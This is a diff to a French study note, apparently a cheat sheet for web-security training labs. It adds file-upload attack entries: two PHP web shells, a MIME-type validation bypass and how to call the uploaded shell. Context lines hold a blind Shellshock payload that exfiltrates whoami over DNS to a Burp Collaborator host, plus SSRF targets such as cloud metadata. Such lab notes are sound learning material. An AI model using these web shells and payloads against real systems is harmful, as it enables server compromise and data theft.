@@ -95,3 +95,12 @@ statut: en cours
 - `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` avec `Referer: http://192.168.0.X:8080` — Shellshock en aveugle, balayage du dernier octet
 - Hors formation, à garder en tête : `http://169.254.169.254/` (métadonnées cloud), `file://`, `gopher://`
 - Détail : [[SSRF-serveur-local]], [[SSRF-systemes-back-end]], [[SSRF-filtre-liste-noire]], [[SSRF-filtre-liste-blanche]], [[SSRF-redirection-ouverte]], [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]
+
+### File upload ([[File-upload]])
+- `<?php echo file_get_contents('/home/carlos/secret'); ?>` — web shell minimal de lecture de fichier
+- `<?php system($_GET['command']); ?>` — web shell polyvalent ; appel : `GET /files/avatars/exploit.php?command=id`
+- `Content-Type: image/jpeg` dans la **partie fichier** du `multipart/form-data` — contournement d'une validation sur le type MIME annoncé
+- `GET /files/avatars/<fichier>` dans Repeater, nom remplacé par `exploit.php` — appel du fichier téléversé pour déclencher l'exécution
+- Filtre **Images** de **Proxy > HTTP history** — retrouver l'URL de service des fichiers téléversés
+- Techniques de contournement d'extension, de configuration et de contenu : à ajouter quand elles seront étudiées
+- Détail : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]
